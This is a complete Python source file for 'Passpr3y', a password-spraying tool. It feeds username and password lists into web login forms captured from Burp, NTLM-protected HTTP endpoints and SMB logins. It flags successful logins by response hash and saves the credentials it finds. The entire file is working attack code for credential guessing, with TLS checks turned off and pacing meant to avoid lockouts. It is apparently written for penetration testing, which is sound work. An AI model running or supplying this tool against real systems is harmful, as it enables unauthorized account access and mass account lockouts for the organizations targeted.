#!/usr/bin/python3

# 1. This program comes with no promises, warranties, or apologies. 
# 2. Use this program at your own risk and responsibility.
# 3. When this program is used aggressively, there is a good chance that 
#       you may lock out a large number of Active Directory 
#       accounts. Refer to number 2.
# 4. Default settings of this program are meant to help prevent 
#       something like that from happening.

import argparse
import collections
from typing import Collection, List
import requests
from requests_ntlm import HttpNtlmAuth
from smb.SMBConnection import SMBConnection
from nmb.NetBIOS import NetBIOS
import os
import sys
import time
import socket
import hashlib
import random
import string
import pprint
import logging

# INSTALL this package using "pip3 install git+https://github.com/phohenecker/stream-to-logger"
# This helps redirect all print statements to a file for later examination
import streamtologger
streamtologger.redirect(target="./passpr3y_output.txt")

# Get rid of dem warnings, this a gottam hak tool
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Disable logging from pysmb
logging.getLogger('SMB').setLevel(logging.CRITICAL)
logging.getLogger('NMB').setLevel(logging.CRITICAL)

# Console colors
G = '\033[92m'  # green
Y = '\033[93m'  # yellow
B = '\033[94m'  # blue
R = '\033[91m'  # red
W = '\033[0m'   # white

# File to store hits, create if missing
PASSPR3Y_HITS_FILE = "passpr3y_hits.txt"
if not os.access(PASSPR3Y_HITS_FILE, os.R_OK):
    with open(PASSPR3Y_HITS_FILE, 'a'):
        os.utime(PASSPR3Y_HITS_FILE, None)

def get_dict_from_headers(lineList: List) -> collections.OrderedDict:
    d = collections.OrderedDict()
    for line in map(str.strip, lineList[1:-1]):
        if line != "":
            header, value = line.split(": ")
            d[header] = value
    return d


class Passpr3y:
    def __init__(self, requestFile, usernameFile, passwordFile, duration=7200, ssl=False, shotgun=False, proxy=None, ntlm=False, smb=False, ip="127.0.0.1", domain="."):

        # Check python version
        if sys.version_info[0] < 3:
            raise Exception("Must be using Python 3")

        self.requestFile = requestFile
        self.usernameFile = usernameFile
        self.passwordFile = passwordFile
        self.duration = duration
        self.ssl = ssl
        self.shotgun = shotgun
        self.proxy = { 'http' : proxy, 'https' : proxy}
        self.ntlm = ntlm
        self.smb = smb
        self.ip = ip
        self.domain = domain

        # Create log directory
        if not os.path.exists("logs"):
            os.makedirs("logs")

        # Parse web request file, preserve order of headers
        if not self.ntlm and not self.smb :
            requestFile = open(self.requestFile, 'r')
            lineList = requestFile.readlines()
            newlineIndex = lineList.index('\n')
            self.endPoint = lineList[0].split(' ')[1].strip()
            self.headerDict = collections.OrderedDict(item.split(': ') for item in map(str.strip, lineList[1:newlineIndex]))
            self.dataDict = collections.OrderedDict(item.split('=') for item in map(str.strip, lineList[newlineIndex+1].split('&')))
            requestFile.close()
            if("USERPR3Y" not in self.dataDict.values() or "PASSPR3Y" not in self.dataDict.values()):
                sys.exit("Error: USERPR3Y or PASSPR3Y not present in POST request parameters.")
        elif self.ntlm:
            requestFile = open(self.requestFile, 'r')
            lineList = requestFile.readlines()
            # self.headerDict = collections.OrderedDict(item.split(': ') for item in map(str.strip, lineList[1:-1]))
            self.headerDict = get_dict_from_headers(lineList)
            requestFile.close()


        # Parse usernames file
        usernameFileHandle = open(self.usernameFile, 'r')
        self.usernameList = list(map(str.strip, usernameFileHandle.readlines()))
        usernameFileHandle.close()

        # Parse passwords file
        passwordFileHandle = open(self.passwordFile, 'r')
        self.passwordList = list(map(str.strip, passwordFileHandle.readlines()))
        passwordFileHandle.close()

        # Figure out time intervals
        self.shotgunSleepTime = int(self.duration)
        self.slowSleepTime = float(self.shotgunSleepTime)/float(len(self.usernameList))

        # Get injection points
        if(not self.ntlm and not self.smb):
            for key,value in self.dataDict.items():
                if value == "USERPR3Y":
                    self.usernameKey = key
                elif value == "PASSPR3Y":
                    self.passwordKey = key
    
    def showWarning(self):
        # Ensure spray time is appropriate
        if(not self.shotgun):
            if input("You will be spraying against " + str(len(self.usernameList)) + " users over the course of " + str(self.shotgunSleepTime) + " seconds.\nThere is a " + str(self.slowSleepTime) + " second wait between each user attempt.\nIs that cool? (y/N) ").lower() != 'y':
                sys.exit("Change spray time.")
        else:
            if input("You've selected the shotgun method.\nThis will spray ALL users without pausing between each user.\nAfter spraying ALL users, there is a " + str(self.shotgunSleepTime) + " second wait. Opsec is questionable.\nIs that cool? (y/N) ").lower() != 'y':
                sys.exit("Don't set shotgun flag.")

    def performTest(self):
        if(not self.smb):
            randomUser = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
            randomPass = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
            print("%sPerforming test request to benchmark failed attempt...%s" % (Y,W))

            if(not self.ntlm):
                self.test_response = self.performRequest(randomUser, randomPass)
            else:
                self.test_response = self.performNTLMRequest(randomUser, randomPass)

            self.test_hexDigest = self.getHashFromResponse(self.test_response)

            if(self.test_response.status_code == 400):
                print("%sTest request returned status code " % (R) + str(self.test_response.status_code) + "%s" % (W))
                if(input("Are you sure you want to continue? (y/N) ") != 'y'):
                    sys.exit("Unsatisfactory HTTP response code.")
            else:
                print("%sTest request did not return 400, moving on.%s\n" % (G,W))
        else:
            print("%sAttempting to reach machine for SMB login...%s" % (Y,W))
            n = NetBIOS()
            ip = n.queryIPForName(self.ip)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((self.ip, 445))
                s.shutdown(2)
                print("%sMachine is available on port 445, moving on.%s\n" % (G,W))
            except:
                print("%sCan't reach machine on port 445" % (R) + str(self.test_response.status_code) + "%s" % (W))
                if(input("Are you sure you want to continue? (y/N) ") != 'y'):
                    sys.exit("Double check IP and port 445 open.")
                return False

    def performSpray(self):
        # Spray
        for password in self.passwordList:
            # Get time right before spray
            date = time.strftime("%m.%d.%Y", time.localtime())
            tyme = time.strftime("%H:%M:%S", time.localtime())
            responseDict = {}

            print("Password " + str(self.passwordList.index(password) + 1) + " of " + str(len(self.passwordList)))

            # Perform spray
            for idx, username in enumerate(self.usernameList, start=1):
                if(not self.smb):
                    if(self.ntlm):
                        response = self.performNTLMRequest(username, password)
                    else:
                        response = self.performRequest(username, password)

                    hexDigest = self.getHashFromResponse(response)

                    # Check if hash matches test response, if not, print request and response
                    if(hexDigest != self.test_hexDigest):
                        print("\t(" + str(idx) + "/" + str(len(self.usernameList)) + ') ' + "%s" % (G) + username + ':' + password + "%s" % (W) + " --- Anomalous response, check log file " + hexDigest)
                        print(username + ":" + password, file=open(PASSPR3Y_HITS_FILE, "a"))
                    else:
                        print("\t(" + str(idx) + "/" + str(len(self.usernameList)) + ') ' + username + ':' + password)

                    # Store hash of response. Chance of collision but very minimal.
                    responseDict[hexDigest] = response
                else:
                    try:
                        response = self.performSMBRequest(self.domain, username, password, self.ip)
                    except Exception as e:
                        print("\tSMB exception: " + e.strerror)
                        continue

                    
                    if response:
                        print("\t(" + str(idx) + "/" + str(len(self.usernameList)) + ') ' + "%s" % (G) + self.domain + '\\' + username + ':' + password + "%s" % (W) + " --- SMB login successful")
                        print(username + ":" + password, file=open(PASSPR3Y_HITS_FILE, "a"))
                    else:
                        print("\t(" + str(idx) + "/" + str(len(self.usernameList)) + ') ' + self.domain + '\\' + username + ':' + password)


                # Don't sleep after very last spray
                if(not self.shotgun and (password != self.passwordList[-1] or username != self.usernameList[-1])):
                    time.sleep(self.slowSleepTime)

            # Log requests only for web requests, since they can have different post-success responses
            if not self.smb:
                # Indicate number of unique responses
                print("\t\tUnique responses: " + str(len(responseDict)))

                # Create file
                if not os.path.exists("logs/" + date):
                    os.makedirs("logs/" + date)
                if not os.path.exists("logs/" + date + '/' + tyme):
                    os.makedirs("logs/" + date + '/' + tyme)

                # Write to file. Files are named with hashes that distinguish between unique responses.
                for key,value in responseDict.items():
                    fileOut = open("logs/" + date + '/' + tyme + '/' + key + ".html", 'w')

                    # Log request. If there were redirects, log the very first request made.
                    fileOut.write('-'*80 + '\n')
                    fileOut.write("REQUEST")
                    fileOut.write('\n' + '-'*80 + '\n')

                    requestToLog = requests.Request()
                    if(value.history):
                        requestToLog = value.history[0].request
                    else:
                        requestToLog = value.request

                    fileOut.write(str(requestToLog.url) + '\n\n')
                    for k2,v2 in requestToLog.headers.items():
                        fileOut.write(k2 + ": " + v2 + '\n')
                    fileOut.write('\n' + str(requestToLog.body) + '\n')

                    # Log response
                    if(value.history):
                        for historyItem in value.history:
                            fileOut.write('\n' + '-'*80 + '\n')
                            fileOut.write("RESPONSE")
                            fileOut.write('\n' + '-'*80 + '\n')

                            fileOut.write(str(historyItem.status_code) + ' ' + historyItem.reason + '\n')
                            for k2,v2 in historyItem.headers.items():
                                fileOut.write(k2 + ": " + v2 + '\n')
                            fileOut.write('\n' + historyItem.text)

                    fileOut.write('\n' + '-'*80 + '\n')
                    fileOut.write("RESPONSE")
                    fileOut.write('\n' + '-'*80 + '\n')

                    fileOut.write(str(value.status_code) + ' ' + value.reason + '\n')
                    for k2,v2 in value.headers.items():
                        fileOut.write(k2 + ": " + v2 + '\n')
                    fileOut.write('\n' + value.text)

                    fileOut.close()

            if(self.shotgun and password is not self.passwordList[-1]):
                time.sleep(self.shotgunSleepTime)

    def getHashFromResponse(self, response):
        # Create hash of response
        checksummer = hashlib.md5()
        checksummer.update(response.content)
        return checksummer.hexdigest()

    def performRequest(self, username, password):
        # Load injection points
        self.dataDict[self.usernameKey] = username
        self.dataDict[self.passwordKey] = password
        
        # Attempt login
        if(self.ssl):
            url = "https://" + self.headerDict["Host"] + self.endPoint
        else:
            url = "http://" + self.headerDict["Host"] + self.endPoint

        # Convert to string to avoid encoding issues
        data_str = "&".join("%s=%s" % (k,v) for k,v in self.dataDict.items())

        # Prepare and send request
        r = requests.Request('POST', url=url, headers=self.headerDict, data=data_str)
        prepped = r.prepare()
        s = requests.Session()
        s.proxies = self.proxy
        s.verify = False

        return s.send(prepped)

    def performNTLMRequest(self, username, password):
        if(self.ssl):
            url = "https://" + self.headerDict["Host"] + '/'
        else:
            url = "http://" + self.headerDict["Host"] + '/'
        
        return requests.get(url, proxies=self.proxy, verify=False, auth=HttpNtlmAuth(username, password))

    def performSMBRequest(self, domain, username, password, ip):
        n = NetBIOS()
        machineName = n.queryIPForName(ip)[0]
        randomClientName = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
        conn = SMBConnection(username, password, randomClientName, machineName, domain)
        return conn.connect(ip)

def pretty_print_POST(req):
    """
    At this point it is completely built and ready
    to be fired; it is "prepared".

    However pay attention at the formatting used in
    this function because it is programmed to be pretty
    printed and may differ from the actual request.
    """
    print('{}\n{}\n{}\n\n{}'.format(
        '-----------START-----------',
        req.method + ' ' + req.url,
        '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ))
if __name__ == '__main__':
    # Parse command line arguments
    parser = argparse.ArgumentParser()

    parser.add_argument("--request", default="request.txt", help="Name of request file in Burp format. Default is 'request.txt'.")
    parser.add_argument("--usernames", default="usernames.txt", help="Name of usernames file. Default is 'usernames.txt'.")
    parser.add_argument("--passwords", default="passwords.txt", help="Name of passwords file. Default is 'passwords.txt'.")
    parser.add_argument("--duration", default="7200", help="Total spray duration in seconds. Default is 7200 seconds.")
    parser.add_argument("--ssl", action="store_true", help="Use https.")
    parser.add_argument("--shotgun", action="store_true", help="Spray all users with no pause.")
    parser.add_argument("--proxy", help="Specify proxy. Format: 'http://127.0.0.1:8080'")
    parser.add_argument("--ntlm", action="store_true", help="Use NTLM.")
    parser.add_argument("--smb", action="store_true", help="Login over SMB. Needs ip and domain options.")
    parser.add_argument("--ip", help="Needed for SMB login spray.")
    parser.add_argument("--domain", help="Needed for SMB login spray. Use '.' for local auth.")

    args = parser.parse_args()

    programheader = """
    __________                      __________       ________
    \______   \_____    ______ _____\______   \______\_____  \___.__.
     |     ___/\__  \  /  ___//  ___/|     ___/\_  __ \_(__  <   |  |
     |    |     / __ \_\___ \ \___ \ |    |     |  | \%s/       \___  |
     |____|    (____  /____  >____  >|____|     |__| /______  / ____|
                    \/     \/     \/                        \/\/

    %s\tBrought to you by Faisal Tameesh (%s@DreadSystems%s)
    \tShoutout to the folks at %s@DepthSecurity%s
    """%(R,W,R,W,B,W)

    print("\n" + "-"*73)
    print(programheader)
    print("-"*73 + "\n")

    pr3y = Passpr3y(requestFile=args.request, \
            usernameFile=args.usernames, \
            passwordFile=args.passwords, \
            duration=args.duration, \
            shotgun=args.shotgun, \
            ssl=args.ssl, \
            proxy=args.proxy, \
            ntlm=args.ntlm, \
            smb=args.smb, \
            ip=args.ip, \
            domain=args.domain)

    pr3y.showWarning()

    pr3y.performTest()

    pr3y.performSpray()
